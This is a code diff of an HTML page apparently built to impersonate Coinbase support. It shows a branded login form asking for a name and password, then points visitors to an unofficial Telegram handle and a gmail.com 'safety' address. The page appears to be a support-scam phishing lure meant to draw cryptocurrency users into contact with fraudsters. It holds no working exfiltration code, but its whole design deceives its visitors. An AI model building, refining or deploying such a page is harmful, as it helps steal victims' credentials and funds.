@@ -1,66 +1,77 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Coinbase Support</title>
   <style>
     body {
       margin: 0;
-      background-color: #0a0f1c;
+      padding: 0;
+      background-color: #0e1320;
       font-family: Arial, sans-serif;
       color: white;
-    }
-    .container {
       display: flex;
-      align-items: center;
       justify-content: center;
+      align-items: center;
       flex-direction: column;
-      min-height: 100vh;
     }
-    .box {
-      background-color: #1e293b;
+    .login-box {
+      margin-top: 40px;
+      background-color: #1b2233;
       padding: 40px;
-      border-radius: 12px;
+      border-radius: 10px;
+      text-align: center;
       width: 100%;
       max-width: 400px;
-      text-align: center;
     }
-    .logo-text {
-      width: 180px;
-      margin-bottom: 25px;
-    }
-    input, button {
-      font-size: 16px;
-      padding: 12px;
-      border-radius: 8px;
+    .login-box input {
       width: 100%;
+      padding: 12px;
       margin: 10px 0;
       border: none;
-      box-sizing: border-box;
+      border-radius: 5px;
     }
-    button {
+    .login-box button {
+      width: 100%;
+      padding: 12px;
       background-color: #3b82f6;
+      border: none;
+      border-radius: 5px;
       color: white;
-      cursor: pointer;
+      font-size: 16px;
+    }
+    .contact-options {
+      margin-top: 30px;
+      text-align: center;
+    }
+    .contact-options a {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      margin: 5px;
+      color: white;
+      text-decoration: none;
+    }
+    .contact-options img {
+      width: 20px;
+      height: 20px;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="box">
-      <img src="coinbase-logo.png" alt="Coinbase Logo" class="logo-text"/>
-      <h2>Log in to Support</h2>
-      <input type="text" placeholder="Name"/>
-      <input type="password" placeholder="Password"/>
-      <button onclick="document.getElementById('after-login').style.display='block'; window.scrollTo(0, document.body.scrollHeight)">Log In</button>
-    </div>
-
-    <div id="after-login" style="display:none; text-align:center;">
-      <h2 style="margin-top:40px;">Contact Options</h2>
-      <a href="https://t.me/coinbasesupportbot" class="link-button" target="_blank">📨 Contact via Telegram</a>
-      <a href="mailto:CoinbaseEuropeSafety@gmail.com" class="link-button">✉️ Contact via Email</a>
-    </div>
+  <img src="coinbase.png" alt="Coinbase Logo" style="width:150px;margin-bottom:20px;" />
+  <div class="login-box">
+    <h2>Log in to Support</h2>
+    <input type="text" placeholder="Name" />
+    <input type="password" placeholder="Password" />
+    <button>Log In</button>
+  </div>
+  <div class="contact-options">
+    <h3>Contact Options</h3>
+    <a href="https://t.me/coinbaseeuropesupport"><img src="telegram.png" alt="Telegram Icon" />Contact via Telegram</a>
+    <a href="mailto:CoinbaseEuropeSafety@gmail.com"><img src="email.png" alt="Email Icon" />Contact via Email</a>
   </div>
 </body>
 </html>
